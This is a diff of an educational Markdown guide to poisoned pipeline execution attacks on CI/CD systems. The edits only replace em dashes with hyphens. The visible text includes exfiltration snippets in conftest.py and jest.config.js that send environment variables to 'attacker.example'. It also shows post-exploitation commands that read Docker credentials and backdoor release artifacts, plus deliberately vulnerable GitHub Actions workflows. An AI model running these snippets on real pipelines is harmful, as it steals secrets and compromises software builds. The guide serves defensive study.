@@ -11,9 +11,9 @@
 
 ## Understanding PPE Attack Vectors
 
-> **⚠️ EDUCATIONAL PURPOSE ONLY** — the techniques below are shown so you can find and fix these issues in pipelines you own or are authorised to test. Do not exploit systems without explicit permission.
+> **⚠️ EDUCATIONAL PURPOSE ONLY** - the techniques below are shown so you can find and fix these issues in pipelines you own or are authorised to test. Do not exploit systems without explicit permission.
 
-Poisoning a pipeline is not about defeating a firewall or brute-forcing a login. It is about finding a place where **content you can influence is executed by a run that holds privileges you should not have**. The attacker's job is to locate that seam—a trigger, a checkout, a script, an expression—and slip code through it.
+Poisoning a pipeline is not about defeating a firewall or brute-forcing a login. It is about finding a place where **content you can influence is executed by a run that holds privileges you should not have**. The attacker's job is to locate that seam-a trigger, a checkout, a script, an expression-and slip code through it.
 
 The attacker's goal in this category is usually one of:
 
@@ -81,7 +81,7 @@ pipeline {
 }
 ```
 
-**Payoff**: code execution on the Jenkins agent with whatever credentials the job binds—often broad, and frequently a non-ephemeral agent.
+**Payoff**: code execution on the Jenkins agent with whatever credentials the job binds-often broad, and frequently a non-ephemeral agent.
 
 ## Indirect PPE Vectors (I-PPE)
 
@@ -113,21 +113,21 @@ Package managers run scripts defined in the repo. A trusted `npm ci` or `npm run
 }
 ```
 
-**Payoff**: `npm ci`/`npm install` triggers `preinstall`/`postinstall` automatically—no explicit build step required.
+**Payoff**: `npm ci`/`npm install` triggers `preinstall`/`postinstall` automatically-no explicit build step required.
 
 ### 5. Test / Lint Config Executed as Code
 
 Many test and lint tools load configuration files that are executable code. Running the test step executes them.
 
 ```python
-# conftest.py — pytest imports and executes this automatically
+# conftest.py - pytest imports and executes this automatically
 import os, urllib.request, base64
 data = base64.b64encode(str(dict(os.environ)).encode())
 urllib.request.urlopen('https://attacker.example/x', data)
 ```
 
 ```javascript
-// jest.config.js — executed by node when tests run
+// jest.config.js - executed by node when tests run
 const { execSync } = require('child_process');
 execSync('curl -s https://attacker.example/x -d "$(env | base64)"');
 module.exports = { testEnvironment: 'node' };
@@ -137,11 +137,11 @@ module.exports = { testEnvironment: 'node' };
 
 ## Public PPE Vectors (3PE)
 
-3PE is D-PPE or I-PPE triggered by a **fork pull request from an outsider**—the attacker needs no repository permissions. The GitHub Actions trigger model is where most 3PE lives.
+3PE is D-PPE or I-PPE triggered by a **fork pull request from an outsider**-the attacker needs no repository permissions. The GitHub Actions trigger model is where most 3PE lives.
 
 ### 6. `pull_request_target` + Checkout of Untrusted Head
 
-The `pull_request_target` trigger runs in the *base* repository's context—with secrets and a read/write `GITHUB_TOKEN`—but is intended only for trusted automation (labelling, commenting). Checking out and running the PR's code under it hands secrets to the outsider.
+The `pull_request_target` trigger runs in the *base* repository's context-with secrets and a read/write `GITHUB_TOKEN`-but is intended only for trusted automation (labelling, commenting). Checking out and running the PR's code under it hands secrets to the outsider.
 
 ```yaml
 # VULNERABLE
@@ -162,7 +162,7 @@ jobs:
 
 ### 7. Script Injection via Untrusted Event Data
 
-Fields an outsider controls—PR title, branch name, commit message, issue body—are interpolated directly into a shell `run:` step. GitHub expands `${{ }}` *before* the shell runs, so the value becomes part of the command.
+Fields an outsider controls-PR title, branch name, commit message, issue body-are interpolated directly into a shell `run:` step. GitHub expands `${{ }}` *before* the shell runs, so the value becomes part of the command.
 
 ```yaml
 # VULNERABLE
@@ -180,7 +180,7 @@ Fields an outsider controls—PR title, branch name, commit message, issue body�
 An action referenced by a mutable tag or branch resolves to whatever code that reference points to *at run time*.
 
 ```yaml
-# VULNERABLE — mutable references
+# VULNERABLE - mutable references
 - uses: some-org/build-action@main    # branch can be repointed
 - uses: some-org/build-action@v1      # tag can be moved to new code
 ```
@@ -190,7 +190,7 @@ An action referenced by a mutable tag or branch resolves to whatever code that r
 ### 9. Fork PR on a Self-Hosted Runner
 
 ```yaml
-# VULNERABLE — untrusted PR code on a persistent internal runner
+# VULNERABLE - untrusted PR code on a persistent internal runner
 on: [pull_request]         # or pull_request_target
 jobs:
   test:
@@ -200,7 +200,7 @@ jobs:
       - run: make test        # attacker's Makefile runs on your infrastructure
 ```
 
-**Payoff**: code execution on a non-ephemeral host inside the trusted network—persistence, credential harvesting, and lateral movement, not just secret theft.
+**Payoff**: code execution on a non-ephemeral host inside the trusted network-persistence, credential harvesting, and lateral movement, not just secret theft.
 
 ## Post-Exploitation from the Runner
 
@@ -223,7 +223,7 @@ ls -la ~ /home/runner/work; cat ~/.docker/config.json 2>/dev/null
 sed -i 's/RELEASE/BACKDOORED/' dist/app.js
 ```
 
-**Payoff**: the pipeline's identity becomes the attacker's identity—toward source, registries, cloud, and the release itself.
+**Payoff**: the pipeline's identity becomes the attacker's identity-toward source, registries, cloud, and the release itself.
 
 ## Chaining PPE
 
@@ -249,11 +249,11 @@ pull_request_target + PR-head checkout  -> outsider code runs with secrets
 
 ## Key Takeaways
 
-1. **PPE is found by reading pipeline files, not by fuzzing**—triggers, checkout refs, run steps, and action pins tell the attacker exactly where the seam is.
+1. **PPE is found by reading pipeline files, not by fuzzing**-triggers, checkout refs, run steps, and action pins tell the attacker exactly where the seam is.
 2. **Direct, Indirect, and Public PPE are one idea**: attacker-influenced content executed by a privileged run.
-3. **Fork PRs are the biggest surface**—`pull_request_target` with untrusted checkout, injectable event fields, and self-hosted runners are the recurring 3PE patterns.
-4. **Indirect PPE hides in ordinary files**—Makefiles, package hooks, and test/lint configs are all executable.
-5. **The runner is a pivot**—secrets, tokens, cloud metadata, and the artifact itself are all reachable once code runs.
+3. **Fork PRs are the biggest surface**-`pull_request_target` with untrusted checkout, injectable event fields, and self-hosted runners are the recurring 3PE patterns.
+4. **Indirect PPE hides in ordinary files**-Makefiles, package hooks, and test/lint configs are all executable.
+5. **The runner is a pivot**-secrets, tokens, cloud metadata, and the artifact itself are all reachable once code runs.
 
 ## Next Steps
 
